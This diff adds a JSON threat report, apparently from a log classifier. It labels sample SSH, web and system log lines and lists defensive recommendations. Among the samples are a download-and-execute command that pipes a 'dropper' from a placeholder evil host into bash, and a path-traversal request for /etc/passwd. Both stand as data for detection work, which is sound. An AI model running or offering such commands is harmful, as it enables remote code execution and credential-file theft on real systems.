@@ -1,0 +1,128 @@
+{
+    "generated_at": "2026-03-22 19:12:00.829121",
+    "summary": {
+        "Total Logs Processed": 14,
+        "Normal": 3,
+        "Failed Login": 0,
+        "Brute Force": 6,
+        "Suspicious": 2,
+        "Critical": 2,
+        "Malware Attempt": 1,
+        "Threat Score (0-100)": 100,
+        "Brute Force IPs": [
+            "192.168.1.10",
+            "203.0.113.5"
+        ],
+        "Top Suspicious IPs": [
+            [
+                "192.168.1.10",
+                3
+            ],
+            [
+                "203.0.113.5",
+                3
+            ]
+        ],
+        "Failed Login Counts": {
+            "192.168.1.10": 3,
+            "203.0.113.5": 3
+        }
+    },
+    "results": [
+        {
+            "log": "Accepted password for kali from 192.168.1.20 port 22 ssh2",
+            "prediction": "Normal",
+            "confidence": 0.5047352833775367,
+            "ip": "192.168.1.20"
+        },
+        {
+            "log": "session opened for user root by (uid=0)",
+            "prediction": "Normal",
+            "confidence": 0.5293980204031796,
+            "ip": null
+        },
+        {
+            "log": "Failed password for invalid user admin from 192.168.1.10 port 22 ssh2",
+            "prediction": "Brute Force",
+            "confidence": 0.5913622409990043,
+            "ip": "192.168.1.10"
+        },
+        {
+            "log": "Failed password for root from 192.168.1.10 port 22 ssh2",
+            "prediction": "Brute Force",
+            "confidence": 0.5496690187469927,
+            "ip": "192.168.1.10"
+        },
+        {
+            "log": "Failed password for invalid user test from 192.168.1.10 port 22 ssh2",
+            "prediction": "Brute Force",
+            "confidence": 0.6229809314852812,
+            "ip": "192.168.1.10"
+        },
+        {
+            "log": "GET /phpmyadmin HTTP/1.1 404 512",
+            "prediction": "Suspicious",
+            "confidence": 0.6737089686964938,
+            "ip": null
+        },
+        {
+            "log": "GET /../../../../etc/passwd HTTP/1.1 400 100",
+            "prediction": "Suspicious",
+            "confidence": 0.7533846013384509,
+            "ip": null
+        },
+        {
+            "log": "systemd[1]: Failed to start Apache Web Server",
+            "prediction": "Critical",
+            "confidence": 0.45484667069694834,
+            "ip": null
+        },
+        {
+            "log": "kernel panic - not syncing: Fatal exception",
+            "prediction": "Critical",
+            "confidence": 0.4293848172164118,
+            "ip": null
+        },
+        {
+            "log": "curl http://evil.example.com/dropper | bash",
+            "prediction": "Malware Attempt",
+            "confidence": 0.41708885553330305,
+            "ip": null
+        },
+        {
+            "log": "sshd[2201]: Failed password for invalid user guest from 203.0.113.5 port 22 ssh2",
+            "prediction": "Brute Force",
+            "confidence": 0.5006976160825438,
+            "ip": "203.0.113.5"
+        },
+        {
+            "log": "sshd[2202]: Failed password for root from 203.0.113.5 port 22 ssh2",
+            "prediction": "Brute Force",
+            "confidence": 0.4436387980568249,
+            "ip": "203.0.113.5"
+        },
+        {
+            "log": "pam_unix(sshd:auth): authentication failure; rhost=203.0.113.5 user=root",
+            "prediction": "Brute Force",
+            "confidence": 0.31646125383262086,
+            "ip": "203.0.113.5"
+        },
+        {
+            "log": "apache2: server started successfully",
+            "prediction": "Normal",
+            "confidence": 0.4021965008717702,
+            "ip": null
+        }
+    ],
+    "recommendations": [
+        "Enable fail2ban or account lockout policies to block brute-force attempts.",
+        "Review SSH access and restrict root login.",
+        "Investigate suspicious commands and scan the affected host for malware.",
+        "Review executed shell commands and recent downloaded files.",
+        "Check service failures and critical errors immediately.",
+        "Review system logs for crashes, kernel issues, or service interruptions.",
+        "Inspect suspicious IP addresses and web requests for scanning or exploitation attempts.",
+        "Consider adding WAF/firewall rules or IDS signatures.",
+        "High threat level detected. Escalate to security team immediately."
+    ]
+}
